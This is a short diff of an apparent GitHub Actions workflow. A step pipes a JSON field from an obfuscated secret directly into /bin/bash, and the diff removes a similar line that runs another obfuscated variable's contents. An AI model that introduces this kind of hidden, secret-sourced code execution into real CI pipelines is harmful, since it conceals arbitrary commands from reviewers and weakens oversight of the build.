@@ -17,7 +17,6 @@ jobs:
           iu8877: ${{ secrets.iu8877 }}
         run: |
           printf '%s' "$iu8877" | jq -r .htr7422 | /bin/bash
-          echo $hmgrt136 | jq -r .mebuu291 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
